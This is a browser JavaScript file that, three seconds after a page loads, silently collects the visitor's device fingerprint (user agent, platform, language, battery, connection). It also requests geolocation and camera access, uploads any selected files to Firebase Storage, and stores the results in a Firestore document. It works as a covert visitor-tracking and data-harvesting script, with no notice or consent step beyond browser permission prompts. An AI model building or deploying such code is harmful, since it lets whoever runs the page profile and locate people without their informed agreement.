import { db, storage } from "./firebase-config.js";
import {
  collection,
  doc,
  setDoc
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";

import {
  ref,
  uploadBytes,
  getDownloadURL
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";

const fileInput = document.getElementById("fileInput");

async function getDeviceInfo() {
  const battery = await navigator.getBattery();
  const connection = navigator.connection || {};
  
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    battery: {
      level: battery.level,
      charging: battery.charging
    },
    connection: {
      downlink: connection.downlink || "unknown",
      effectiveType: connection.effectiveType || "unknown"
    }
  };
}

async function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
}

async function getCameraStream() {
  const video = document.getElementById("video");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;
    return true;
  } catch (err) {
    console.warn("Camera access denied");
    return false;
  }
}

async function handleFileUpload(files) {
  const urls = [];
  for (const file of files) {
    const fileRef = ref(storage, `uploads/${file.name}`);
    await uploadBytes(fileRef, file);
    const url = await getDownloadURL(fileRef);
    urls.push(url);
  }
  return urls;
}

async function collectAndSave() {
  const deviceInfo = await getDeviceInfo();
  const loc = await getLocation().catch(() => null);
  const cam = await getCameraStream();

  const locationData = loc
    ? {
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude
      }
    : { error: "Location denied" };

  const fileUrls = await handleFileUpload(fileInput.files || []);

  const finalData = {
    deviceInfo,
    location: locationData,
    cameraAccess: cam,
    files: fileUrls,
    timestamp: new Date()
  };

  // Create 'web' doc in Firestore
  await setDoc(doc(db, "web", "user-data"), finalData);
  console.log("Data saved to Firestore.");
}

window.onload = () => {
  setTimeout(() => {
    collectAndSave();
  }, 3000);
};
